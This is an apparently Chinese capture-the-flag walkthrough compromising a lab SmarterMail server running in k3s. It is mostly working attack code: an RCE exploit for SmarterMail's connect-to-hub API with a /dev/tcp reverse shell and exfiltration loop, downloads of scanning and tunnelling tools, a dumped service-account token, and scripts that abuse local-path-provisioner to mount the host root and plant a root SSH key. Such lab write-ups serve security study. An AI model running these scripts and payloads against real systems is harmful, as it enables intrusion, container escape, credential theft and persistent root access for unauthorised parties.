靶场地址：192.168.88.124

```markdown
┌──(root㉿kali-plus)-[~/Desktop/kali]
└─# nmap -p- 192.168.88.124
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-18 18:49 CST
Nmap scan report for 192.168.88.124
Host is up (0.020s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
6443/tcp  open  sun-sr-https
10250/tcp open  unknown
30081/tcp open  unknown
30819/tcp open  unknown
31319/tcp open  unknown
MAC Address: 08:00:27:8F:51:6D (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.87 seconds
                                                                                                                                                            
┌──(root㉿kali-plus)-[~/Desktop/kali]
└─# 
```

<!-- 这是一张图片，ocr 内容为：[A] [春 X AWI 192 腾讯 CIS 银河 JAY SIMA 门. 192.168.88.124:30081/INTERFACE/ROOT#/LOGIN 丛不安全 JY 公 所有书签 JAVA打链 资产收集 FL-600T神武教学... PHP反序列化从入... CLAUDE CODE API 渗透 SSTI BOLG RAINBOWSEC SRC 欢迎使用SMARTERMAIL 电子邮件地址 必填字段. 密码 记住我 登录 一旦登录,即表示您接受此网站的COOKIEWEBMAIL无法兼容于私密或无痕刘览模式. -->
![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773831233564-d9218392-a262-4d05-b739-64437ceaa350.png)

外网是一个SmarterMail

调用CVE

```markdown
https://github.com/g0vguy/WT-2026-0001
```


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773831375945-691d7234-7766-41b6-9608-f49922fb1247.png)

```markdown
[*] Manual verification required:
    1. Visit http://192.168.88.124:30081/login.aspx
    2. Username: admin
    3. Password: Hacked123!@#
```

成功登陆进去


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773831943418-16a94a1e-011e-41de-9934-99162809c986.png)

ai写了一个exp能直接rce上去

```markdown
┌──(root㉿kali-plus)-[~/Desktop/test]
└─# cat exp.py 
import threading, json, time, requests, uuid, socket
from http.server import BaseHTTPRequestHandler, HTTPServer

TARGET='http://192.168.88.124:30081'
ATTACKER='192.168.88.197'
HUB_PORT=8085
LEAK_PORT=9091
mount='/tmp/m'+uuid.uuid4().hex[:8]

recv_data=[]

def tcp_listener():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(('0.0.0.0',LEAK_PORT))
    s.listen(1)
    s.settimeout(30)
    try:
        c,addr=s.accept()
        chunks=[]
        c.settimeout(5)
        while True:
            try:
                d=c.recv(4096)
                if not d:
                    break
                chunks.append(d)
            except socket.timeout:
                break
        recv_data.append(b''.join(chunks).decode('utf-8','ignore'))
        c.close()
    except Exception:
        pass
    s.close()

listener_thread=threading.Thread(target=tcp_listener,daemon=True)
listener_thread.start()

#cmd=(
#    f'exec 3<>/dev/tcp/{ATTACKER}/{LEAK_PORT}; '
#    'for f in /user.txt /root/user.txt /home/*/user.txt; do '
#    '[ -f "$f" ] && echo "[FILE]$f" >&3 && cat "$f" >&3 && echo >&3; '
#    'done; '
#    'for f in $(find / -name user.txt 2>/dev/null | head -n 10); do '
#    'echo "[FOUND]$f" >&3; '
#    'done; '
#    'exec 3<&-; exec 3>&-'
#)
cmd = (
    f'bash -i >& /dev/tcp/192.168.88.197/9999 0>&1'
  )


class Hub(BaseHTTPRequestHandler):
    def do_POST(self):
        ln=int(self.headers.get('Content-Length','0'))
        _=self.rfile.read(ln).decode('utf-8','ignore')
        payload={
            'ClusterID':'f0e12780-f462-4b51-a7db-149f1d56209c',
            'SharedSecret':'x',
            'TargetHubs':{'a':'b'},
            'IsStandby':False,
            'SystemMount':{
                'Enabled':True,
                'ReadOnly':False,
                'MountPath':mount,
                'CommandMount':cmd,
                'UseArgumentsInCommand':False
            },
            'SystemAdminUsernames':['admin']
        }
        data=json.dumps(payload).encode()
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.send_header('Content-Length',str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self,*a):
        return

srv=HTTPServer(('0.0.0.0',HUB_PORT),Hub)
threading.Thread(target=srv.serve_forever,daemon=True).start()
time.sleep(1)

req={'hubAddress':f'http://{ATTACKER}:{HUB_PORT}','oneTimePassword':'x','nodeName':'node1'}
r=requests.post(TARGET+'/api/v1/settings/sysadmin/connect-to-hub',json=req,timeout=40)
print('[*] connect-to-hub:', r.status_code, r.text[:500])

listener_thread.join(timeout=35)
srv.shutdown(); srv.server_close()

print('\n==== leaked ====' )
print(recv_data[0] if recv_data else 'NO DATA')

```


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773833994755-a9d54372-8092-4a5c-9e4c-ea40774bc6d2.png)

拿ai写的脚本成功弹shell


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773834038274-d63c752d-3955-4160-858d-537c1b278d18.png)

拿下user.txt

```markdown
riBPvcwvKoZZkOBBP4pCwtFuOBCKaKkR
```

本来想写入公钥但是突然想到这是k3s容器内部

只能拉取文件

```markdown
wget https://VPSIP/fscan
```

然后扫一下内网看看,输出如下

```markdown
root@smartermail-app-8469cbb85d-frx2n:~# ./fscan -h 10.42.0.0/24
./fscan -h 10.42.0.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 10.42.0.0       is alive
(icmp) Target 10.42.0.1       is alive
(icmp) Target 10.42.0.2       is alive
(icmp) Target 10.42.0.3       is alive
(icmp) Target 10.42.0.4       is alive
(icmp) Target 10.42.0.5       is alive
(icmp) Target 10.42.0.6       is alive
(icmp) Target 10.42.0.7       is alive
[*] Icmp alive hosts len is: 8
10.42.0.5:8080 open
10.42.0.6:8000 open
10.42.0.2:443 open
10.42.0.6:9000 open
10.42.0.1:443 open
10.42.0.2:80 open
10.42.0.1:80 open
10.42.0.0:80 open
10.42.0.1:22 open
10.42.0.0:22 open
10.42.0.0:443 open
10.42.0.5:8181 open
10.42.0.6:8443 open
10.42.0.6:9100 open
10.42.0.3:10250 open
10.42.0.1:10250 open
10.42.0.0:10250 open
[*] alive ports len is: 17
start vulscan
[*] WebTitle http://10.42.0.5:8181     code:404 len:19     title:None
[*] WebTitle http://10.42.0.0          code:404 len:19     title:None
[*] WebTitle http://10.42.0.1          code:404 len:19     title:None
[*] WebTitle http://10.42.0.2          code:404 len:19     title:None
[*] WebTitle https://10.42.0.1:10250   code:404 len:19     title:None
[*] WebTitle https://10.42.0.0:10250   code:404 len:19     title:None
[*] WebTitle https://10.42.0.2         code:404 len:19     title:None
[*] WebTitle https://10.42.0.0         code:404 len:19     title:None
[*] WebTitle https://10.42.0.6:9100    code:404 len:19     title:None
[*] WebTitle https://10.42.0.1         code:404 len:19     title:None
[*] WebTitle http://10.42.0.5:8080     code:404 len:19     title:None
[*] WebTitle https://10.42.0.6:8443    code:404 len:19     title:None
[*] WebTitle https://10.42.0.3:10250   code:403 len:217    title:None
[*] WebTitle https://10.42.0.6:8000    code:404 len:19     title:None
[*] WebTitle https://10.42.0.6:9000    code:404 len:19     title:None

```

注意可能因为要爆破ssh所以这里需要等待一会但是应该没啥用

搭建Stowaway代理

在我的服务器上直接上

```markdown
./linux_x64_admin -l 1234 -s 123
```

靶机：

```markdown
wget https://VPSIP/linux_x64_agent
./linux_x64_agent -c VPSIP:1234 -s 123 --reconnect 8
```

看大小感觉突破口在

```markdown
[*] WebTitle https://10.42.0.3:10250   code:403 len:217    title:None
```


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773835322782-df574cf3-5d79-47ae-a67a-a81bf0f736e8.png)

成功挂上代理,访问了我们感觉有地方的问题之后出现如下信息

```markdown
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}
```


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773835468467-8c3adc06-e48c-4d1c-a094-cd75b6697f09.png)

我们先安装kubectl

```markdown
curl -LO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl
chmod +x kubectl
mv kubectl /usr/local/bin/
```

然后我们链接过去

```markdown
kubectl exec -it 10.42.0.3 -- sh
```

发现我们根本没有权限跟着ai的走一走

先看：

```plain
ls /var/run/secrets/kubernetes.io/serviceaccount/
```


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773836098282-69a3477a-2328-41e8-ace8-970b82ba7ce8.png)

```plain
当前 SA 是低权限 SA（典型初始 foothold）
```

首先我们需要确认基础信息

```markdown
id
hostname
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

```markdown
root@smartermail-app-8469cbb85d-8xmq7:/etc/smartermail# id
hostname
cat /var/run/secrets/kubernetes.io/serviceaccount/namespaceid
uid=0(root) gid=0(root) groups=0(root)
root@smartermail-app-8469cbb85d-8xmq7:/etc/smartermail# hostname
smartermail-app-8469cbb85d-8xmq7
root@smartermail-app-8469cbb85d-8xmq7:/etc/smartermail# 
</run/secrets/kubernetes.io/serviceaccount/namespace    
shinnai-kankyou
```

可以看到有个预期命名空间shinnai-kankyou

确认可用权限

```markdown
root@smartermail-app-8469cbb85d-8xmq7:/etc/smartermail# /root/kubectl auth can-i --list
<7:/etc/smartermail# /root/kubectl auth can-i --list    
Resources                                       Non-Resource URLs                     Resource Names   Verbs
persistentvolumeclaims                          []                                    []               [create]
pods                                            []                                    []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
storageclasses.storage.k8s.io                   []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
pods/log                                        []                                    []               [get]
root@smartermail-app-8469cbb85d-8xmq7:/etc/smartermail# 

```


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773884757063-fefb0e41-9b62-4c38-bf31-842f1d0c685b.png)

<font style="color:rgb(51, 51, 51);">核心可用权限（本题足够）：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">create pods</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">create persistentvolumeclaims</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">create storageclasses</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">get pods/log</font>`

<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);"></font>

先复制容器里面的token

在反弹 shell 执行：

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

把整段 JWT 复制出来，填到下面ai写的脚本 `TOKEN`位置。

```markdown
root@smartermail-app-8469cbb85d-8xmq7:/etc/smartermail# cat /var/run/secrets/kubernetes.io/serviceaccount/token
</var/run/secrets/kubernetes.io/serviceaccount/token    
eyJhbGciOiJSUzI1NiIsImtpZCI6IjlPQjBZTk1GR2JFYnBMa1JqZlRVcnBoT1M5ek1YQU82TTRSTFh0TTdzX1UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODA1NDE5ODk3LCJpYXQiOjE3NzM4ODM4OTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJzaGlubmFpLWthbmt5b3UiLCJwb2QiOnsibmFtZSI6InNtYXJ0ZXJtYWlsLWFwcC04NDY5Y2JiODVkLTh4bXE3IiwidWlkIjoiMTIwM2U4NTEtZmNjYS00Mjk3LTg0MjAtYTE1MjczY2M1OTY2In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJ1cmEtb21vdGUtc2EiLCJ1aWQiOiJiN2JkZjZhNS04MDBiLTQyZTAtOWYzNy04YTAwZTkzZWE2MWUifSwid2FybmFmdGVyIjoxNzczODg3NTA0fSwibmJmIjoxNzczODgzODk3LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6c2hpbm5haS1rYW5reW91OnVyYS1vbW90ZS1zYSJ9.UaKm62M2ljo5YK4b72R-FkIEpTvurkDWzmVinTu6ZEBfp6aE1bjTP2cXiSYZ7dDuu9CJv-b3wfBvqD-7jTGNTYewZwOAsD0J5ytHYBeS0bZtbYVHkngq75Gjf-tIoUoJd7McEn6d0SB-gztrxrsGCx8WrGZjWjBOUKE0A4Jbkin0L5xBme4jC-6r1Ey_gHCtyQRfxXGT8iD1ynyhlczxHji5PbLVV63vPowD82l358VyaQ5LbMqxVHssMBUsGiaABfcNwpL4Q3PM7s6kl1xjVCYjwrZWuaTNS1kK7pXTra5F82uF7K6xNQUwtz9PZMcNDb7Eeh1jrMdPVrsWMVn61Qroot@smartermail-app-8469cbb85d-8xmq7:/etc/smartermail# 

```

```markdown
cat > /tmp/get_host_root.py <<'PY'
import requests, uuid, time

requests.packages.urllib3.disable_warnings()
API = 'https://192.168.88.124:6443'
NS = 'shinnai-kankyou'
TOKEN = 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjlPQjBZTk1GR2JFYnBMa1JqZlRVcnBoT1M5ek1YQU82TTRSTFh0TTdzX1UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODA1NDE5ODk3LCJpYXQiOjE3NzM4ODM4OTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJzaGlubmFpLWthbmt5b3UiLCJwb2QiOnsibmFtZSI6InNtYXJ0ZXJtYWlsLWFwcC04NDY5Y2JiODVkLTh4bXE3IiwidWlkIjoiMTIwM2U4NTEtZmNjYS00Mjk3LTg0MjAtYTE1MjczY2M1OTY2In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJ1cmEtb21vdGUtc2EiLCJ1aWQiOiJiN2JkZjZhNS04MDBiLTQyZTAtOWYzNy04YTAwZTkzZWE2MWUifSwid2FybmFmdGVyIjoxNzczODg3NTA0fSwibmJmIjoxNzczODgzODk3LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6c2hpbm5haS1rYW5reW91OnVyYS1vbW90ZS1zYSJ9.UaKm62M2ljo5YK4b72R-FkIEpTvurkDWzmVinTu6ZEBfp6aE1bjTP2cXiSYZ7dDuu9CJv-b3wfBvqD-7jTGNTYewZwOAsD0J5ytHYBeS0bZtbYVHkngq75Gjf-tIoUoJd7McEn6d0SB-gztrxrsGCx8WrGZjWjBOUKE0A4Jbkin0L5xBme4jC-6r1Ey_gHCtyQRfxXGT8iD1ynyhlczxHji5PbLVV63vPowD82l358VyaQ5LbMqxVHssMBUsGiaABfcNwpL4Q3PM7s6kl1xjVCYjwrZWuaTNS1kK7pXTra5F82uF7K6xNQUwtz9PZMcNDb7Eeh1jrMdPVrsWMVn61Q'

H = {'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json'}
A = {'Authorization': 'Bearer ' + TOKEN}


def post(path, obj):
    r = requests.post(API + path, headers=H, json=obj, verify=False, timeout=20)
    print('POST', path, r.status_code)
    if r.status_code >= 300:
        print(r.text[:260])
    return r


def wait_log(pod, tries=14, sec=2):
    for i in range(tries):
        time.sleep(sec)
        r = requests.get(
            API + f'/api/v1/namespaces/{NS}/pods/{pod}/log?container=p&tailLines=500&insecureSkipTLSVerifyBackend=true',
            headers=A,
            verify=False,
            timeout=20,
        )
        if r.status_code == 200 and r.text.strip():
            print(f'LOG_OK {pod} {i}')
            print(r.text)
            return r.text
        print('LOG_WAIT', pod, i, r.status_code)
    return ''


u = uuid.uuid4().hex[:6]

# Step 1: pathPattern='/'，拿到 local-path 根目录并写 symlink
sc1 = 'sc-root-' + u
pvc1 = 'pvc-root-' + u
pod1 = 'pod-root-' + u

post('/apis/storage.k8s.io/v1/storageclasses', {
    'apiVersion': 'storage.k8s.io/v1',
    'kind': 'StorageClass',
    'metadata': {'name': sc1},
    'provisioner': 'rancher.io/local-path',
    'reclaimPolicy': 'Delete',
    'volumeBindingMode': 'WaitForFirstConsumer',
    'parameters': {'pathPattern': '/'}
})

post(f'/api/v1/namespaces/{NS}/persistentvolumeclaims', {
    'apiVersion': 'v1',
    'kind': 'PersistentVolumeClaim',
    'metadata': {'name': pvc1, 'namespace': NS},
    'spec': {
        'accessModes': ['ReadWriteOnce'],
        'resources': {'requests': {'storage': '16Mi'}},
        'storageClassName': sc1,
    }
})

cmd1 = 'ls -la /mnt | head -n 120; ln -sfn / /mnt/hostroot; ls -la /mnt | grep hostroot; sleep 8'

post(f'/api/v1/namespaces/{NS}/pods', {
    'apiVersion': 'v1',
    'kind': 'Pod',
    'metadata': {'name': pod1, 'namespace': NS},
    'spec': {
        'restartPolicy': 'Never',
        'containers': [{
            'name': 'p',
            'image': 'rancher/local-path-provisioner:v0.0.30',
            'command': ['/bin/sh', '-c'],
            'args': [cmd1],
            'volumeMounts': [{'name': 'v', 'mountPath': '/mnt'}],
        }],
        'volumes': [{'name': 'v', 'persistentVolumeClaim': {'claimName': pvc1}}],
    }
})

wait_log(pod1)

# Step 2: 挂 pathPattern='/hostroot'，读取宿主机 root.txt
sc2 = 'sc-host-' + u
pvc2 = 'pvc-host-' + u
pod2 = 'pod-host-' + u

post('/apis/storage.k8s.io/v1/storageclasses', {
    'apiVersion': 'storage.k8s.io/v1',
    'kind': 'StorageClass',
    'metadata': {'name': sc2},
    'provisioner': 'rancher.io/local-path',
    'reclaimPolicy': 'Delete',
    'volumeBindingMode': 'WaitForFirstConsumer',
    'parameters': {'pathPattern': '/hostroot'}
})

post(f'/api/v1/namespaces/{NS}/persistentvolumeclaims', {
    'apiVersion': 'v1',
    'kind': 'PersistentVolumeClaim',
    'metadata': {'name': pvc2, 'namespace': NS},
    'spec': {
        'accessModes': ['ReadWriteOnce'],
        'resources': {'requests': {'storage': '16Mi'}},
        'storageClassName': sc2,
    }
})

cmd2 = (
    'echo FIND_BEGIN; '
    'ls -la /mnt | head -n 120; '
    'for f in /mnt/root/root.txt /mnt/etc/rancher/root.txt /mnt/root.txt; do '
    '[ -f "$f" ] && echo FILE:$f && cat "$f"; '
    'done; '
    'echo FIND_END; sleep 10'
)

post(f'/api/v1/namespaces/{NS}/pods', {
    'apiVersion': 'v1',
    'kind': 'Pod',
    'metadata': {'name': pod2, 'namespace': NS},
    'spec': {
        'restartPolicy': 'Never',
        'containers': [{
            'name': 'p',
            'image': 'rancher/local-path-provisioner:v0.0.30',
            'command': ['/bin/sh', '-c'],
            'args': [cmd2],
            'volumeMounts': [{'name': 'v', 'mountPath': '/mnt'}],
        }],
        'volumes': [{'name': 'v', 'persistentVolumeClaim': {'claimName': pvc2}}],
    }
})

log = wait_log(pod2)

print('\n===== RESULT =====')
if 'FILE:/mnt/root/root.txt' in log or 'FILE:/mnt/etc/rancher/root.txt' in log:
    print('root.txt 已在上方日志打印')
else:
    print('未命中 root.txt，请重跑（通常是 token 粘贴错误或环境残留）')
PY

python3 /tmp/get_host_root.py


```


![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773885452507-e7297ecf-d140-44ff-a36e-d6c219a682a8.png)

到这里已经可以拿到root.txt了

```markdown
ifslbeonVnU7eHvVvN1KCQ8sLoNz0jxC
```

但是我们还需要拿shell，稍微修改一下脚本，直接写入公钥然后我们可以直接ssh上去

```markdown
import os
import subprocess
import time
import uuid

import requests

requests.packages.urllib3.disable_warnings()

TARGET = '192.168.88.124'
API = f'https://{TARGET}:6443'
NS = 'shinnai-kankyou'
TOKEN = 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjlPQjBZTk1GR2JFYnBMa1JqZlRVcnBoT1M5ek1YQU82TTRSTFh0TTdzX1UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODA1NDE5ODk3LCJpYXQiOjE3NzM4ODM4OTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJzaGlubmFpLWthbmt5b3UiLCJwb2QiOnsibmFtZSI6InNtYXJ0ZXJtYWlsLWFwcC04NDY5Y2JiODVkLTh4bXE3IiwidWlkIjoiMTIwM2U4NTEtZmNjYS00Mjk3LTg0MjAtYTE1MjczY2M1OTY2In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJ1cmEtb21vdGUtc2EiLCJ1aWQiOiJiN2JkZjZhNS04MDBiLTQyZTAtOWYzNy04YTAwZTkzZWE2MWUifSwid2FybmFmdGVyIjoxNzczODg3NTA0fSwibmJmIjoxNzczODgzODk3LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6c2hpbm5haS1rYW5reW91OnVyYS1vbW90ZS1zYSJ9.UaKm62M2ljo5YK4b72R-FkIEpTvurkDWzmVinTu6ZEBfp6aE1bjTP2cXiSYZ7dDuu9CJv-b3wfBvqD-7jTGNTYewZwOAsD0J5ytHYBeS0bZtbYVHkngq75Gjf-tIoUoJd7McEn6d0SB-gztrxrsGCx8WrGZjWjBOUKE0A4Jbkin0L5xBme4jC-6r1Ey_gHCtyQRfxXGT8iD1ynyhlczxHji5PbLVV63vPowD82l358VyaQ5LbMqxVHssMBUsGiaABfcNwpL4Q3PM7s6kl1xjVCYjwrZWuaTNS1kK7pXTra5F82uF7K6xNQUwtz9PZMcNDb7Eeh1jrMdPVrsWMVn61Q'
SSH_PRIVKEY = '/tmp/host_root_key'
PUBKEY = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfQ7woQ9cFWvej/H4TOY/X/maOsUyvvPnYZi06XZu0oCc2HLM8F5NM0UJXwy2QqKFlD8M6GDK2ULMAGt3WCiphiQvotwa8JYGSUm6jVHD1ijmGbQBIjrgWiBlB50Yj206QB0yNcl5o0c984jqIs0/ocZsKvMoeveQdQRscUlxWaembWQEu1w+TdgfqajBOKUhMHZhcB3PAFqSuTomjbfndcEitkDHRk1XRW3BXWgZpoTHR0UHrIJGS2oapvSDw3po3nKHxWFYCI6xE+9CYmjxfPpzIfU/0A0PMUYwKk+Qhs9z+GIV7P4jZ/y8wNsFNqihJWc0+/rMUIYLoZcpvW92D lab-root'

H = {'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json'}
A = {'Authorization': 'Bearer ' + TOKEN}


def post(path, obj):
    r = requests.post(API + path, headers=H, json=obj, verify=False, timeout=20)
    print('POST', path, r.status_code)
    if r.status_code >= 300:
        print(r.text[:260])
    return r


def wait_log(pod, tries=50, sec=2):
    for i in range(tries):
        time.sleep(sec)
        r = requests.get(
            API + f'/api/v1/namespaces/{NS}/pods/{pod}/log?container=p&tailLines=3000&insecureSkipTLSVerifyBackend=true',
            headers=A,
            verify=False,
            timeout=20,
        )
        if r.status_code == 200 and r.text.strip():
            print(f'LOG_OK {pod} {i}')
            print(r.text)
            return r.text
        print('LOG_WAIT', pod, i, r.status_code)
    return ''


u = uuid.uuid4().hex[:6]

# Step 1: create the hostroot symlink inside a local-path PV directory.
sc1 = 'sc-root-' + u
pvc1 = 'pvc-root-' + u
pod1 = 'pod-root-' + u

post('/apis/storage.k8s.io/v1/storageclasses', {
    'apiVersion': 'storage.k8s.io/v1', 'kind': 'StorageClass',
    'metadata': {'name': sc1}, 'provisioner': 'rancher.io/local-path',
    'reclaimPolicy': 'Delete', 'volumeBindingMode': 'WaitForFirstConsumer',
    'parameters': {'pathPattern': '/'}
})
post(f'/api/v1/namespaces/{NS}/persistentvolumeclaims', {
    'apiVersion': 'v1', 'kind': 'PersistentVolumeClaim',
    'metadata': {'name': pvc1, 'namespace': NS},
    'spec': {'accessModes': ['ReadWriteOnce'], 'resources': {'requests': {'storage': '16Mi'}}, 'storageClassName': sc1}
})
cmd1 = 'ls -la /mnt | head -n 120; ln -sfn / /mnt/hostroot; ls -la /mnt | grep hostroot; sleep 8'
post(f'/api/v1/namespaces/{NS}/pods', {
    'apiVersion': 'v1', 'kind': 'Pod',
    'metadata': {'name': pod1, 'namespace': NS},
    'spec': {
        'restartPolicy': 'Never',
        'containers': [{'name': 'p', 'image': 'rancher/local-path-provisioner:v0.0.30',
            'command': ['/bin/sh', '-c'], 'args': [cmd1],
            'volumeMounts': [{'name': 'v', 'mountPath': '/mnt'}]}],
        'volumes': [{'name': 'v', 'persistentVolumeClaim': {'claimName': pvc1}}],
    }
})
wait_log(pod1)

# Step 2: mount host / and plant a root SSH key instead of reading root.txt directly.
sc2 = 'sc-host-' + u
pvc2 = 'pvc-host-' + u
pod2 = 'pod-host-' + u

post('/apis/storage.k8s.io/v1/storageclasses', {
    'apiVersion': 'storage.k8s.io/v1', 'kind': 'StorageClass',
    'metadata': {'name': sc2}, 'provisioner': 'rancher.io/local-path',
    'reclaimPolicy': 'Delete', 'volumeBindingMode': 'WaitForFirstConsumer',
    'parameters': {'pathPattern': '/hostroot'}
})
post(f'/api/v1/namespaces/{NS}/persistentvolumeclaims', {
    'apiVersion': 'v1', 'kind': 'PersistentVolumeClaim',
    'metadata': {'name': pvc2, 'namespace': NS},
    'spec': {'accessModes': ['ReadWriteOnce'], 'resources': {'requests': {'storage': '16Mi'}}, 'storageClassName': sc2}
})

cmd2 = f'''
set -eux
mkdir -p /mnt/root/.ssh
chmod 700 /mnt/root/.ssh
touch /mnt/root/.ssh/authorized_keys
grep -qxF "{PUBKEY}" /mnt/root/.ssh/authorized_keys || printf '%s\\n' "{PUBKEY}" >> /mnt/root/.ssh/authorized_keys
sort -u /mnt/root/.ssh/authorized_keys -o /mnt/root/.ssh/authorized_keys
chmod 600 /mnt/root/.ssh/authorized_keys
echo "=== ROOT_SSH_READY ==="
ls -ld /mnt/root /mnt/root/.ssh /mnt/root/.ssh/authorized_keys
tail -n 5 /mnt/root/.ssh/authorized_keys
sleep 8
'''

post(f'/api/v1/namespaces/{NS}/pods', {
    'apiVersion': 'v1', 'kind': 'Pod',
    'metadata': {'name': pod2, 'namespace': NS},
    'spec': {
        'restartPolicy': 'Never',
        'containers': [{'name': 'p', 'image': 'rancher/local-path-provisioner:v0.0.30',
            'command': ['/bin/sh', '-c'], 'args': [cmd2],
            'volumeMounts': [{'name': 'v', 'mountPath': '/mnt'}]}],
        'volumes': [{'name': 'v', 'persistentVolumeClaim': {'claimName': pvc2}}],
    }
})

log = wait_log(pod2)

print('\n' + '=' * 70)
print('RESULT')
print('=' * 70)
if 'ROOT_SSH_READY' in log and 'lab-root' in log:
    print('Host root SSH key planted successfully.')
    ssh_cmd = [
        'ssh',
        '-o', 'StrictHostKeyChecking=no',
        '-o', 'UserKnownHostsFile=/dev/null',
        '-i', SSH_PRIVKEY,
        f'root@{TARGET}',
        'id; hostname; cat /root/root.txt',
    ]
    print('RUN:', ' '.join(ssh_cmd))
    if os.path.exists(SSH_PRIVKEY):
        try:
            res = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=30, check=False)
            if res.stdout:
                print(res.stdout.strip())
            if res.stderr:
                print(res.stderr.strip())
        except Exception as exc:
            print(f'SSH exec failed: {exc}')
    else:
        print(f'Missing private key: {SSH_PRIVKEY}')
else:
    print('Failed to prepare root SSH access. Check full pod log above.')
print('=' * 70)

```

然后直接就可以拿到shell了

```markdown
ssh -o StrictHostKeyChecking=no -i /tmp/host_root_key root@192.168.88.124
```

也可以用本地的公钥私钥，这个是新生成的
![](https://cdn.nlark.com/yuque/0/2026/png/40544919/1773887215020-2ac25996-a20f-4a11-897c-83b7294bd959.png)

